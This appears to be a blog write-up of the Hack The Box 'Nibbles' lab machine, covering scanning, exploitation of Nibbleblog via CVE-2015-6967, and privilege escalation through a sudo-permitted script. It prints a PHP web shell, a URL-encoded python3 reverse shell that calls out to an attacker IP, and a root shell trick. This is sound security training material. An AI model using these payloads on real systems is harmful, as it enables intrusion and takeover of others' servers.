---
title: HTB Template
date: 2022-08-08 23:58:00 +0800
categories: [HTB]
tags: [HTB, Easy, External, Nibbleblog, CVE-2015.6967, A06:2021-Vulnerable And Outdated Components]
pin: false
---

![nibbles-img](https://www.hackthebox.com/storage/avatars/344a8f99e8f7dddfed764f791e2731df.png)

This is the writeup for [Nibbles](https://app.hackthebox.com/machines/Nibbles) machine from HTB.

## Scanning and enumeration

Now it's time to start the active scanning.

As always, we define our TARGET and hosts file of our machine to facilitate the process.

```console
TARGET=10.10.10.75
echo "10.10.10.75 nibbles.htb" | sudo tee -a /etc/hosts
```

We launch a single `TCMP` probe to check ping.

```console
ping -c 1 $TARGET		# => Ping is working
```

### NMAP

To scan the `target` to find open ports and possible vulnerabilities we use `nmap`.

First, simple `TCP` scan without `DNS` resolution and ping discovery, to all the ports and with the version detection.

```console
nmap -n -Pn -sV -p- $TARGET -vvv -oG allPorts
```

### Nibbleblog

First we visit the site _<http://nibbles.htb>_, from the source code we can see that there is an indication to `nibbleblog`. This is an important clue because we can already check on the internet.

[CSRF](https://seclists.org/fulldisclosure/2015/Sep/4)
[RCE in My Image plugin](https://seclists.org/fulldisclosure/2015/Sep/5)

It looks like to exploit the `RCE` we might need to be logged in. This is something somehow difficult, because it requires guessing and the machine has a protection in place to avoid people from using tools like `hydra`.

The user can be obtained from the _</nibbleblog/content/private/users.xml>_ and the password must be guessed. (In real life probably we should have exploit the CSRF or XSS and wait for the user to login, with this blacklist protection is hard...)

Once we are inside we are going to use [CVE-2015-6967](https://www.cvedetails.com/cve/CVE-2015-6967/) to upload a '`php webshell`.

```console
echo "<?php system($_REQUEST['cmd']); ?>" > cmd.php
```

Ignore the warnings after uploading the image and go to _</nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami>. It will display the username.

_
## Gaining access

Just launch a reverse shell (I like the shortest python3...)

_<http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.14.8%22%2C7890%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27>_


## Privilege escalation / lateral movements

We execute `sudo -l` to understand if it is possible to execute commands as `sudo`. We see that it is possible to execute `sudo /home/nibbler/personal/stuff/monitor.sh`

The file doesn't exist so we just need to create it and grant permissions

```console
mkdir /home/nibbler/personal
mkdir /home/nibbler/personal/stuff
echo "bash -i" > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```
And we are root!